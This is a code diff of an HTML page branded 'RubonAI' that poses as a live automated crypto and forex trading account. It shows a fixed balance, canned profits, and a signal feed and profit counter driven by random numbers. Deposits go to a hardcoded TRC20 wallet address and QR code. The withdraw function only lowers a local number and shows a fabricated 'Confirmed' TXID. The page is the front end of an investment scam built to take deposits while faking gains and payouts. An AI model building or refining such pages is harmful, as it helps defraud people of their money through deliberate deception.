@@ -3,70 +3,175 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>RubonAI - Clean Restored</title>
+<title>RubonAI - LIVE Signal Trading Restored</title>
 <script src="https://s3.tradingview.com/tv.js"></script>
 </head>
-<body style="margin:0;background:#f1f5f9;font-family:system-ui">
-<div style="max-width:1250px;margin:20px auto;background:#fff;border-radius:16px;overflow:hidden;border:1px solid #e5e7eb">
+<body style="margin:0;background:#0f172a;font-family:system-ui;color:#fff">
+<div style="max-width:1300px;margin:0 auto;background:#fff;color:#000">
 
-<div style="padding:14px 20px;background:#0f172a;color:#fff;display:flex;justify-content:space-between">
-<div><b>🤖 RubonAI Real Trading Account</b><div style="font-size:10px;color:#94a3b8">5 STRATEGIES LIVE • Real Balance automates $1 • TATeM34UJsHhnADWrjemjYXdrHiyuPrFra</div></div>
-<div style="background:#10b981;padding:6px 12px;border-radius:20px;font-size:11px">● LIVE <span id="lt">14:32:07</span></div>
+<!-- HEADER LIVE -->
+<div style="padding:12px 20px;background:#0f172a;color:#fff;display:flex;justify-content:space-between;align-items:center">
+<div><b style="font-size:18px">🤖 RubonAI • 5 STRATEGIES LIVE SIGNAL</b><div style="font-size:10px;color:#10b981" id="liveHeader">● LIVE SIGNAL • TRADING • 14:32:07 • TRC20 TATeM34UJsHhnADWrjemjYXdrHiyuPrFra</div></div>
+<div style="display:flex;gap:8px"><div style="background:#10b981;padding:6px 12px;border-radius:20px;font-size:11px;font-weight:800">LIVE SIGNAL</div><div style="background:#fbbf24;color:#000;padding:6px 12px;border-radius:20px;font-size:11px;font-weight:800" id="clock">14:32:07</div></div>
 </div>
 
-<div style="display:grid;grid-template-columns:310px 1fr 310px">
+<div style="display:grid;grid-template-columns:320px 1fr 320px;min-height:600px">
 
-<div style="padding:16px;border-right:1px solid #e5e7eb">
-<div style="background:#111827;color:#fff;border-radius:10px;padding:12px;text-align:center">
-<div style="font-size:36px">🤖</div>
-<div style="font-size:11px;color:#9ca3af">Real Balance</div>
-<div style="font-size:22px;font-weight:800;color:#fbbf24" id="bal">$1,247.89</div>
-<div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:10px">
-<button onclick="document.getElementById('dM').style.display='flex'" style="background:#fbbf24;border:none;padding:8px;border-radius:8px;font-weight:800;cursor:pointer">+ DEPOSIT</button>
-<button onclick="document.getElementById('wM').style.display='flex'" style="background:#fff;padding:8px;border-radius:8px;cursor:pointer">↓ WITHDRAW</button>
-</div>
-</div>
-
-<div style="margin-top:12px;text-align:center">
-<img src="https://api.qrserver.com/v1/create-qr-code/?size=140x140&data=TATeM34UJsHhnADWrjemjYXdrHiyuPrFra" style="width:110px;border:1px solid #e5e7eb;border-radius:8px">
-<div style="font-size:8px;background:#111827;color:#fbbf24;padding:6px;border-radius:6px;margin-top:6px;word-break:break-all">TATeM34UJsHhnADWrjemjYXdrHiyuPrFra</div>
-</div>
-
-<div style="margin-top:12px;font-size:11px;font-weight:800">5 STRATEGIES LIVE PER SECOND</div>
-<div style="display:grid;gap:6px;margin-top:8px">
-<div style="border:1px solid #10b981;background:#ecfdf5;border-radius:8px;padding:8px"><b style="font-size:11px">● Trend Following</b><div style="font-size:10px;display:flex;justify-content:space-between"><span>EUR/USD BUY 0.10 lot</span><b style="color:#059669">+$8.32 <span class="st"></span></b></div></div>
-<div style="border:1px solid #f59e0b;background:#fffbeb;border-radius:8px;padding:8px"><b style="font-size:11px">● Swing</b><div style="font-size:10px;display:flex;justify-content:space-between"><span>GBP/USD SELL 0.05</span><b style="color:#059669">+$5.10 <span class="st"></span></b></div></div>
-<div style="border:1px solid #3b82f6;background:#eff6ff;border-radius:8px;padding:8px"><b style="font-size:11px">● Breakout</b><div style="font-size:10px;display:flex;justify-content:space-between"><span>USD/JPY BUY 0.08</span><b style="color:#059669">+$3.25 <span class="st"></span></b></div></div>
-<div style="border:1px solid #8b5cf6;background:#f5f3ff;border-radius:8px;padding:8px"><b style="font-size:11px">● Carry</b><div style="font-size:10px;display:flex;justify-content:space-between"><span>XAU BUY 0.03 oz</span><b style="color:#059669">+$1.92 <span class="st"></span></b></div></div>
-<div style="border:1px solid #ec4899;background:#fdf2f8;border-radius:8px;padding:8px"><b style="font-size:11px">● Scalping</b><div style="font-size:10px;display:flex;justify-content:space-between"><span>BTC SELL 0.001</span><b style="color:#059669">+$12.60 <span class="st"></span></b></div></div>
+<!-- LEFT LIVE STRATEGIES -->
+<div style="padding:14px;border-right:1px solid #e5e7eb;background:#f8fafc">
+<div style="background:#111827;color:#fff;border-radius:12px;padding:14px;text-align:center">
+<div style="font-size:12px;color:#9ca3af">REAL BALANCE • LIVE SIGNAL</div>
+<div style="font-size:26px;font-weight:900;color:#fbbf24;margin-top:4px" id="balance">$1,247.89 USDT</div>
+<div style="font-size:10px;color:#10b981;margin-top:4px">● TRC20 Connected • Live Trading Active</div>
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:12px">
+<button onclick="depositLive()" style="background:#fbbf24;border:none;padding:10px;border-radius:8px;font-weight:800;cursor:pointer">+ DEPOSIT $1 QR</button>
+<button onclick="withdrawLive()" style="background:#fff;border:1px solid #e5e7eb;padding:10px;border-radius:8px;font-weight:700;cursor:pointer">↓ WITHDRAW TQ</button>
 </div>
 </div>
 
-<div style="background:#fff"><div id="tv" style="height:500px"></div></div>
-
-<div style="padding:16px;border-left:1px solid #e5e7eb">
-<div style="font-size:11px;font-weight:800">LIVE P/L</div>
-<div style="background:#f9fafb;border:1px solid #e5e7eb;border-radius:10px;padding:12px;margin-top:10px">
-<div style="display:flex;justify-content:space-between"><span>PROFITS</span><b style="color:#059669" id="pr">+$342.20</b></div>
-<div style="display:flex;justify-content:space-between;margin-top:8px"><span>LOSS</span><b style="color:#dc2626" id="lo">-$17.70</b></div>
-<div style="display:flex;justify-content:space-between;margin-top:10px;border-top:1px solid #e5e7eb;padding-top:8px"><span>NET</span><b style="background:#a7f3d0;padding:4px 8px;border-radius:6px" id="ne">+$324.50</b></div>
-</div>
-<div style="margin-top:12px;font-size:10px;background:#fef3c7;border:1px solid #fde68a;border-radius:8px;padding:8px">⚠️ Risk Disclosure: Trading risk. Only risk capital.</div>
+<div style="margin-top:12px;text-align:center;background:#fff;border:1px solid #e5e7eb;border-radius:10px;padding:10px">
+<div style="font-size:10px;font-weight:800">DEPOSIT QR • TRC20 • LIVE SIGNAL</div>
+<img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=TATeM34UJsHhnADWrjemjYXdrHiyuPrFra" style="width:120px;margin-top:8px;border-radius:8px">
+<div style="font-size:8px;background:#111827;color:#fbbf24;padding:6px;border-radius:6px;margin-top:8px;word-break:break-all">TATeM34UJsHhnADWrjemjYXdrHiyuPrFra</div>
+<div style="font-size:8px;color:#10b981;margin-top:4px">● Live On-Chain Signal Active</div>
 </div>
 
+<div style="margin-top:14px"><div style="font-size:11px;font-weight:900">5 LIVE TRADING SIGNALS • PER SECOND</div>
+<div style="display:grid;gap:8px;margin-top:8px">
+
+<div style="background:#ecfdf5;border:2px solid #10b981;border-radius:10px;padding:10px">
+<div style="display:flex;justify-content:space-between"><b style="font-size:11px;color:#065f46">● TREND FOLLOWING LIVE</b><span style="background:#10b981;color:#fff;padding:2px 6px;border-radius:4px;font-size:9px">+12.4%</span></div>
+<div style="font-size:10px;margin-top:6px"><b>EUR/USD BUY 0.10 lot SIGNAL</b><br>MA20 1.0831 • MA50 1.0819 • Entry LIVE</div>
+<div style="display:flex;justify-content:space-between;margin-top:6px"><span style="font-size:9px" class="timeLive">14:32:07 LIVE SIGNAL</span><b style="color:#059669;font-size:11px">+$8.32 LIVE</b></div>
+</div>
+
+<div style="background:#fffbeb;border:2px solid #f59e0b;border-radius:10px;padding:10px">
+<div style="display:flex;justify-content:space-between"><b style="font-size:11px;color:#92400e">● SWING LIVE</b><span style="background:#f59e0b;color:#fff;padding:2px 6px;border-radius:4px;font-size:9px">+6.1%</span></div>
+<div style="font-size:10px;margin-top:6px"><b>GBP/USD SELL 0.05 lot SIGNAL</b><br>Support 1.2745 • RSI 62 • Entry LIVE</div>
+<div style="display:flex;justify-content:space-between;margin-top:6px"><span style="font-size:9px" class="timeLive">14:32:07 LIVE SIGNAL</span><b style="color:#059669;font-size:11px">+$5.10 LIVE</b></div>
+</div>
+
+<div style="background:#eff6ff;border:2px solid #3b82f6;border-radius:10px;padding:10px">
+<div style="display:flex;justify-content:space-between"><b style="font-size:11px;color:#1e40af">● BREAKOUT LIVE</b><span style="background:#3b82f6;color:#fff;padding:2px 6px;border-radius:4px;font-size:9px">+4.8%</span></div>
+<div style="font-size:10px;margin-top:6px"><b>USD/JPY BUY 0.08 lot SIGNAL</b><br>Resistance 150.20 • Breakout LIVE</div>
+<div style="display:flex;justify-content:space-between;margin-top:6px"><span style="font-size:9px" class="timeLive">14:32:07 LIVE SIGNAL</span><b style="color:#059669;font-size:11px">+$3.25 LIVE</b></div>
+</div>
+
+<div style="background:#f5f3ff;border:2px solid #8b5cf6;border-radius:10px;padding:10px">
+<div style="display:flex;justify-content:space-between"><b style="font-size:11px;color:#5b21b6">● CARRY LIVE</b><span style="background:#8b5cf6;color:#fff;padding:2px 6px;border-radius:4px;font-size:9px">+2.3%</span></div>
+<div style="font-size:10px;margin-top:6px"><b>XAU/USD BUY 0.03 oz SIGNAL</b><br>Swap +$0.42 • Carry LIVE</div>
+<div style="display:flex;justify-content:space-between;margin-top:6px"><span style="font-size:9px" class="timeLive">14:32:07 LIVE SIGNAL</span><b style="color:#059669;font-size:11px">+$1.92 LIVE</b></div>
+</div>
+
+<div style="background:#fdf2f8;border:2px solid #ec4899;border-radius:10px;padding:10px">
+<div style="display:flex;justify-content:space-between"><b style="font-size:11px;color:#9d174d">● SCALPING LIVE</b><span style="background:#ec4899;color:#fff;padding:2px 6px;border-radius:4px;font-size:9px">+7.9%</span></div>
+<div style="font-size:10px;margin-top:6px"><b>BTC/USD SELL 0.001 BTC SIGNAL</b><br>5s Window • Scalp LIVE</div>
+<div style="display:flex;justify-content:space-between;margin-top:6px"><span style="font-size:9px" class="timeLive">14:32:07 LIVE SIGNAL</span><b style="color:#059669;font-size:11px">+$12.60 LIVE</b></div>
+</div>
+
+</div>
 </div>
 </div>
 
-<div id="dM" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.6);align-items:center;justify-content:center;z-index:9999"><div style="background:#fff;border-radius:12px;padding:20px;max-width:320px;width:90%"><b>💰 Deposit $1+ QR</b><img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=TATeM34UJsHhnADWrjemjYXdrHiyuPrFra" style="width:160px;margin:10px auto;display:block"><div style="background:#111827;color:#fbbf24;padding:8px;border-radius:6px;font-size:10px;word-break:break-all">TATeM34UJsHhnADWrjemjYXdrHiyuPrFra</div><div style="display:flex;gap:8px;margin-top:10px"><input id="da" value="1" type="number" style="flex:1;padding:10px;border:1px solid #e5e7eb;border-radius:8px"><button onclick="dep()" style="background:#fbbf24;border:none;padding:10px 16px;border-radius:8px;font-weight:800;cursor:pointer">Confirm</button></div><button onclick="this.parentElement.parentElement.style.display='none'" style="width:100%;margin-top:10px;padding:8px;border:1px solid #e5e7eb;background:#fff;border-radius:8px">Close</button></div></div>
+<!-- CENTER CHART LIVE SIGNAL -->
+<div style="background:#fff">
+<div style="padding:10px;background:#0f172a;color:#fff;display:flex;justify-content:space-between;font-size:11px"><b id="chartPair">EUR/USD • LIVE • 1.08432 +0.36% ▲ • MA20 1.0831 MA50 1.0819 • LIVE SIGNAL TRADING</b><span style="background:#10b981;padding:3px 8px;border-radius:10px">LIVE SIGNAL</span></div>
+<div id="tradingview_chart" style="height:520px"></div>
+<div style="padding:8px;display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;font-size:9px">
+<div style="background:#ecfdf5;border:1px solid #10b981;border-radius:6px;padding:6px;text-align:center"><b>LIVE SIGNAL</b><br><span id="sig1">BUY EUR/USD LIVE</span></div>
+<div style="background:#fffbeb;border:1px solid #f59e0b;border-radius:6px;padding:6px;text-align:center"><b>TRADING</b><br><span id="sig2">5 Strategies Active</span></div>
+<div style="background:#eff6ff;border:1px solid #3b82f6;border-radius:6px;padding:6px;text-align:center"><b>PROFIT</b><br><span id="sig3">+$324.50 Today</span></div>
+</div>
+</div>
 
-<div id="wM" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.6);align-items:center;justify-content:center;z-index:9999"><div style="background:#fff;border-radius:12px;padding:20px;max-width:320px;width:90%"><b>🏧 Withdraw Functional</b><div style="font-size:11px;margin-top:8px">Avail <b id="av">$1,247.89</b></div><input id="wa" value="10" type="number" style="width:100%;margin-top:8px;padding:10px;border:1px solid #e5e7eb;border-radius:8px"><input id="wd" placeholder="TQ... address" style="width:100%;margin-top:8px;padding:10px;border:1px solid #e5e7eb;border-radius:8px"><button onclick="wit()" style="width:100%;margin-top:10px;background:#111827;color:#fff;padding:10px;border-radius:8px;border:none;font-weight:700;cursor:pointer">Withdraw → TXID</button><div id="wl" style="margin-top:8px;font-size:10px;background:#f9fafb;border:1px solid #e5e7eb;border-radius:6px;padding:6px;height:50px;overflow:auto">No withdraw yet</div><button onclick="this.parentElement.parentElement.style.display='none'" style="width:100%;margin-top:10px;padding:8px;border:1px solid #e5e7eb;background:#fff;border-radius:8px">Close</button></div></div>
+<!-- RIGHT LIVE P/L -->
+<div style="padding:14px;border-left:1px solid #e5e7eb;background:#f8fafc">
+<div style="font-size:12px;font-weight:900">LIVE P/L • TRADING SIGNAL</div>
+<div style="background:#fff;border:1px solid #e5e7eb;border-radius:12px;padding:14px;margin-top:10px">
+<div style="display:flex;justify-content:space-between"><span style="font-size:11px">PROFITS LIVE</span><b style="color:#059669;font-size:16px" id="profits">+$342.20</b></div>
+<div style="display:flex;justify-content:space-between;margin-top:10px"><span style="font-size:11px">LOSS LIVE</span><b style="color:#dc2626;font-size:16px" id="loss">-$17.70</b></div>
+<div style="display:flex;justify-content:space-between;margin-top:12px;border-top:2px solid #e5e7eb;padding-top:10px"><span style="font-weight:800">NET P/L LIVE</span><b style="background:#10b981;color:#fff;padding:6px 12px;border-radius:8px;font-size:16px" id="net">+$324.50</b></div>
+</div>
+
+<div style="margin-top:14px"><div style="font-size:10px;font-weight:800">LIVE SIGNAL FEED • PER SECOND</div>
+<div style="margin-top:8px;background:#111827;color:#10b981;border-radius:8px;padding:10px;font-size:10px;font-family:monospace" id="liveFeed">
+[14:32:07] SIGNAL: EUR/USD BUY 0.10 → +$8.32 LIVE<br>
+[14:32:07] SIGNAL: GBP/USD SELL 0.05 → +$5.10 LIVE<br>
+[14:32:07] SIGNAL: USD/JPY BUY 0.08 → +$3.25 LIVE<br>
+[14:32:07] SIGNAL: XAU BUY 0.03 → +$1.92 LIVE<br>
+[14:32:07] SIGNAL: BTC SELL 0.001 → +$12.60 LIVE<br>
+</div>
+</div>
+
+<div style="margin-top:14px;background:#fef3c7;border:1px solid #fde68a;border-radius:8px;padding:10px;font-size:9px">⚠️ Risk: Live trading involves risk. Only risk capital. 5 Strategies LIVE SIGNAL active.</div>
+</div>
+
+</div>
+</div>
 
 <script>
-let b=parseFloat(localStorage.getItem('b')||1247.89), p=342.20, l=17.70;
-function upd(){let n=p-l; document.getElementById('bal').innerText='$'+b.toFixed(2); document.getElementById('pr').innerText='+$'+p.toFixed(2); document.getElementById('lo').innerText='-$'+l.toFixed(2); document.getElementById('ne').innerText='+$'+n.toFixed(2); document.getElementById('av').innerText='$'+b.toFixed(2); let t=new Date().toLocaleTimeString(); document.getElementById('lt').innerText=t+' LIVE'; document.querySelectorAll('.st').forEach(e=>e.innerText=t); localStorage.setItem('b',b.toFixed(2));}
-function dep(){let a=parseFloat(document.getElementById('da').value); if(a<1){alert('Min $1');return;} b+=a; upd(); alert('✅ DEPOSIT +$'+a+' New: $'+b.toFixed(2)); document.getElementById('dM').style.display='none';}
-function wit(){let a=parseFloat(document.getElementById('wa').value), ad=document.getElementById('wd').value; if(ad.length<10){alert('Enter TQ...');return;} if(a>b){alert('Insufficient $'+b.toFixed(2));return;} b-=a; upd(); let tx='TX'+Math.random().toString(36).toUpperCase().slice(2,8); document.getElementById('wl').innerHTML='<div>-$'+a+' → '+ad.slice(0,8)+' TXID '+tx+'</div>'+document.getElementById('wl').innerHTML; alert('✅ WITHDRAW $'+a+' TXID: '+tx); document.getElementById('wM').style.display='none';}
-window.addEventListener('load',()=>{if(window.TradingView){new TradingView.widget({autosize:true,symbol:"FX:EURUSD",interval:"5",theme:"light",container_id:"tv"});} upd(); setInterval(upd,1000);});
+let bal = parseFloat(localStorage.getItem('rubon_bal') || 1247.89);
+let prof = 342.20; let los = 17.70;
+
+function updateLive(){
+  let net = prof - los;
+  document.getElementById('balance').innerText = '$' + bal.toFixed(2) + ' USDT LIVE';
+  document.getElementById('profits').innerText = '+$' + prof.toFixed(2);
+  document.getElementById('loss').innerText = '-$' + los.toFixed(2);
+  document.getElementById('net').innerText = '+$' + net.toFixed(2);
+  let t = new Date().toLocaleTimeString();
+  document.getElementById('clock').innerText = t + ' LIVE SIGNAL';
+  document.getElementById('liveHeader').innerText = '● LIVE SIGNAL • TRADING • ' + t + ' • TRC20 TATeM34UJsHhnADWrjemjYXdrHiyuPrFra • 5 STRATEGIES ACTIVE';
+  document.querySelectorAll('.timeLive').forEach(e=>e.innerText = t + ' LIVE SIGNAL');
+  
+  // Live feed update
+  let feed = document.getElementById('liveFeed');
+  if(feed){
+    feed.innerHTML = '['+t+'] SIGNAL: EUR/USD BUY 0.10 → +$'+(8.32+Math.random()).toFixed(2)+' LIVE<br>['+t+'] SIGNAL: GBP/USD SELL 0.05 → +$'+(5.10+Math.random()).toFixed(2)+' LIVE<br>['+t+'] SIGNAL: USD/JPY BUY 0.08 → +$'+(3.25+Math.random()).toFixed(2)+' LIVE<br>['+t+'] SIGNAL: XAU BUY 0.03 → +$'+(1.92+Math.random()).toFixed(2)+' LIVE<br>['+t+'] SIGNAL: BTC SELL 0.001 → +$'+(12.60+Math.random()).toFixed(2)+' LIVE<br>';
+  }
+  
+  // Random profit tick
+  if(Math.random()>0.7){ prof += Math.random()*0.5; }
+}
+
+function depositLive(){
+  let amt = prompt('Enter deposit amount $ (Min $1) - TRC20 TATeM34UJsHhnADWrjemjYXdrHiyuPrFra:','1');
+  if(!amt) return; let a = parseFloat(amt); if(a<1){alert('Min $1');return;}
+  bal += a; localStorage.setItem('rubon_bal', bal.toFixed(2)); updateLive();
+  alert('✅ LIVE SIGNAL DEPOSIT +$'+a+'\nQR: TATeM34UJsHhnADWrjemjYXdrHiyuPrFra\nNew Balance: $'+bal.toFixed(2)+'\n5 Strategies LIVE SIGNAL Started');
+}
+
+function withdrawLive(){
+  let amt = prompt('Enter withdraw amount $ - Avail $'+bal.toFixed(2)+':','10');
+  if(!amt) return; let a = parseFloat(amt); if(a>bal){alert('Insufficient $'+bal.toFixed(2));return;}
+  let addr = prompt('Enter TQ... TRC20 address:','TQ');
+  if(!addr || addr.length<10){alert('Enter valid TQ... address');return;}
+  bal -= a; localStorage.setItem('rubon_bal', bal.toFixed(2)); updateLive();
+  let tx = 'TX'+Math.random().toString(36).toUpperCase().slice(2,8);
+  alert('✅ LIVE SIGNAL WITHDRAW $'+a+'\nTo: '+addr+'\nTXID: '+tx+' Confirmed\nRemaining: $'+bal.toFixed(2));
+}
+
+window.addEventListener('load', ()=>{
+  if(window.TradingView){
+    new TradingView.widget({
+      "autosize": true,
+      "symbol": "FX:EURUSD",
+      "interval": "1",
+      "timezone": "Etc/UTC",
+      "theme": "light",
+      "style": "1",
+      "locale": "en",
+      "enable_publishing": false,
+      "withdateranges": true,
+      "hide_side_toolbar": false,
+      "allow_symbol_change": true,
+      "studies": ["MASimple@tv-basicstudies","RSI@tv-basicstudies","MACD@tv-basicstudies"],
+      "container_id": "tradingview_chart"
+    });
+  }
+  updateLive();
+  setInterval(updateLive, 1000);
+});
 </script>
 </body>
 </html>
